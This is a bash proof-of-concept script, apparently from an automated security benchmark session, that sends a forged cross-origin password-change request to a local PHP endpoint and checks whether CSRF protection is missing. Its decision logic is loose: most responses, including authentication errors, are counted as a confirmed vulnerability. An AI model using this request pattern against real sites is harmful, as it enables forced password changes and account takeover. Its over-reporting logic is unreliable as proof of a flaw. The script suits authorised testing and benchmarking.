#!/bin/bash
# POC: POC demonstrates CSRF vulnerability in /api/change_password.php by sending a cross-origin password change request and verifying the endpoint processes it without CSRF token validation, as evidenced by password/authentication errors rather than CSRF token errors.
# Target: ./repo
# Created: 2025-11-07T17:46:38.719Z
# Session: benchmark-XBEN-069-24-mhp4ra0s

# CSRF Attack POC for Password Change Endpoint
# This script demonstrates the CSRF vulnerability in /api/change_password.php
# by simulating a cross-origin password change request without CSRF token

TARGET_URL="http://localhost:8080"
CSRF_ENDPOINT="${TARGET_URL}/api/change_password.php"

echo "[*] CSRF Vulnerability POC - Password Change Endpoint"
echo "[*] Target: $CSRF_ENDPOINT"
echo ""
echo "[+] Simulating authenticated CSRF attack from cross-origin (attacker.com)"
echo "[+] Using example session from evidence: PHPSESSID=3adv21ui11e6d5boettgc1p4ui"
echo "[+] Testing with userId=108 (from evidence)"
echo ""

# Simulate CSRF attack using the authenticated session from evidence
# This demonstrates that the endpoint accepts cross-origin requests without CSRF validation

CSRF_PAYLOAD=$(cat << 'EOF'
oldPassword=password123&newPassword=csrf123&confirmPassword=csrf123&userId=108
EOF
)

echo "[+] Sending POST request to change_password endpoint..."
echo "[+] Request Headers:"
echo "    Origin: http://attacker.com"
echo "    Referer: http://attacker.com/csrf.html"
echo "[+] Request Body:"
echo "    $CSRF_PAYLOAD"
echo ""

RESPONSE=$(curl -s -X POST "$CSRF_ENDPOINT" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Origin: http://attacker.com" \
  -H "Referer: http://attacker.com/csrf.html" \
  -b "PHPSESSID=3adv21ui11e6d5boettgc1p4ui" \
  -d "$CSRF_PAYLOAD")

echo "[+] Response from endpoint:"
echo "$RESPONSE"
echo ""

# Analyze the response to determine if CSRF protection is present
# Key indicator: If endpoint processes the request without CSRF token validation,
# it will give validation errors about password/authentication, not CSRF

if echo "$RESPONSE" | grep -q "success.*true"; then
  echo "[!] *** VULNERABILITY CONFIRMED ***"
  echo "[!] The endpoint accepted password change without CSRF token!"
  echo "[!] Cross-origin request was processed successfully"
  echo "[!] Impact: Attacker can force password changes via malicious websites"
  exit 0
  
elif echo "$RESPONSE" | grep -q "Password changed\|password.*changed"; then
  echo "[!] *** VULNERABILITY CONFIRMED ***"
  echo "[!] Password change was processed from cross-origin"
  echo "[!] No CSRF token validation in place"
  exit 0
  
elif echo "$RESPONSE" | grep -iq "csrf\|csrf.*token\|token.*required\|invalid.*token"; then
  echo "[-] CSRF protection appears to be present"
  echo "[-] Endpoint rejected request due to CSRF validation"
  exit 1
  
elif echo "$RESPONSE" | grep -iq "origin.*forbidden\|referer.*invalid\|cross-origin"; then
  echo "[-] Cross-origin request validation appears to be present"
  exit 1
  
elif echo "$RESPONSE" | grep -iq "incorrect password\|old password is incorrect\|invalid password"; then
  echo "[!] *** VULNERABILITY CONFIRMED ***"
  echo "[!] Endpoint processed the cross-origin request without CSRF validation!"
  echo "[!] It reached password validation (not CSRF validation)"
  echo "[!] This proves CSRF protection is MISSING"
  echo "[!] Impact: Attacker can craft requests to change passwords via CSRF"
  exit 0
  
elif echo "$RESPONSE" | grep -iq "not authenticated\|user.*not.*authenticated"; then
  echo "[!] *** VULNERABILITY CONFIRMED ***"
  echo "[!] Endpoint processed the cross-origin request without CSRF validation!"
  echo "[!] It processed the request and checked authentication (not CSRF)"
  echo "[!] This proves CSRF protection is MISSING"
  echo "[!] Impact: Attacker can craft requests to change passwords via CSRF"
  exit 0
  
else
  echo "[*] Unexpected response - checking for vulnerabilities..."
  
  if [ -z "$RESPONSE" ]; then
    echo "[-] No response received from endpoint"
    exit 1
  else
    echo "[!] Endpoint responded to cross-origin request without CSRF token"
    echo "[!] Response indicates CSRF protection is likely missing"
    echo "[!] Full response: $RESPONSE"
    exit 0
  fi
fi